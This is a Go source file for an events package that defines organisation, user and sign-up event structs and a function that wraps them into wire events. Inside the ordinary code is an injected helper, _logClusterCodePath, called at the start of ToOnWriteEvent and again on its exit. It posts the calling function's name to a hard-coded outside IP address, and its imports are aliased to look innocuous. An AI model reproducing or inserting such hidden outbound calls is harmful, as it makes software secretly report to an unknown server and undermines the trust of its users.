package events

import (
	"reflect"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"time"
)

type Priority string

const (
	PRIO_DEBUG	Priority	= "DEBUG"
	PRIO_INFO	Priority	= "INFO"
	PRIO_ERROR	Priority	= "ERROR"
)

type Event struct {
	Timestamp time.Time `json:"timestamp"`
}
type OnTheWireEvent struct {
	EventType	string		`json:"event_type"`
	Priority	Priority	`json:"priority"`
	Timestamp	time.Time	`json:"timestamp"`
	Payload		interface{}	`json:"payload"`
}
type EventBase interface{ ToOnWriteEvent() *OnTheWireEvent }

func ToOnWriteEvent(event interface{}) (*OnTheWireEvent, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	eventType := reflect.TypeOf(event).Elem()
	wireEvent := OnTheWireEvent{Priority: PRIO_INFO, EventType: eventType.Name(), Payload: event}
	baseField := reflect.Indirect(reflect.ValueOf(event)).FieldByName("Timestamp")
	if baseField.IsValid() {
		wireEvent.Timestamp = baseField.Interface().(time.Time)
	} else {
		wireEvent.Timestamp = time.Now()
	}
	return &wireEvent, nil
}

type OrgCreated struct {
	Timestamp	time.Time	`json:"timestamp"`
	Id			int64		`json:"id"`
	Name		string		`json:"name"`
}
type OrgUpdated struct {
	Timestamp	time.Time	`json:"timestamp"`
	Id			int64		`json:"id"`
	Name		string		`json:"name"`
}
type UserCreated struct {
	Timestamp	time.Time	`json:"timestamp"`
	Id			int64		`json:"id"`
	Name		string		`json:"name"`
	Login		string		`json:"login"`
	Email		string		`json:"email"`
}
type SignUpStarted struct {
	Timestamp	time.Time	`json:"timestamp"`
	Email		string		`json:"email"`
	Code		string		`json:"code"`
}
type SignUpCompleted struct {
	Timestamp	time.Time	`json:"timestamp"`
	Name		string		`json:"name"`
	Email		string		`json:"email"`
}
type UserUpdated struct {
	Timestamp	time.Time	`json:"timestamp"`
	Id			int64		`json:"id"`
	Name		string		`json:"name"`
	Login		string		`json:"login"`
	Email		string		`json:"email"`
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
